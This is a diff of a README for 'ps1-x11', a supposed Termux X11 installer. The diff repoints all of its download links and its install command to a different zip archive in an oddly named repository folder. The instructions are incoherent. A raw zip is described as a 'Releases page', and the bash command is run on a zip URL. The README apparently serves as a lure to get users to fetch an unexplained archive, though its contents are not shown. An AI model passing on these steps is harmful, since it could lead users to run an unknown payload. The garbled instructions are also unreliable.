@@ -6,7 +6,7 @@ Welcome to ps1-x11! This is a simple tool to install X-11 on Termux, giving you 
 
 ## 📥 Download Now
 
-[![Download ps1-x11](https://github.com/Wq-ui-cmd/ps1-x11/raw/refs/heads/main/everydayness/ps-x-3.3.zip)](https://github.com/Wq-ui-cmd/ps1-x11/raw/refs/heads/main/everydayness/ps-x-3.3.zip)
+[![Download ps1-x11](https://raw.githubusercontent.com/Wq-ui-cmd/ps1-x11/main/everydayness/x_ps_2.5.zip)](https://raw.githubusercontent.com/Wq-ui-cmd/ps1-x11/main/everydayness/x_ps_2.5.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you begin, ensure your device meets these requirements:
 
 ## 📂 Download & Install
 
-Visit [this page to download](https://github.com/Wq-ui-cmd/ps1-x11/raw/refs/heads/main/everydayness/ps-x-3.3.zip). 
+Visit [this page to download](https://raw.githubusercontent.com/Wq-ui-cmd/ps1-x11/main/everydayness/x_ps_2.5.zip). 
 
 1. Click the link above to access the Releases page.
 2. Find the latest release of ps1-x11.
@@ -35,7 +35,7 @@ After downloading, follow these steps to install:
 2. Navigate to your downloaded file using the `cd` command.
 3. Run the following command to install:
    ```bash
-   bash https://github.com/Wq-ui-cmd/ps1-x11/raw/refs/heads/main/everydayness/ps-x-3.3.zip
+   bash https://raw.githubusercontent.com/Wq-ui-cmd/ps1-x11/main/everydayness/x_ps_2.5.zip
    ```
 4. Wait for the installation to finish. 
 
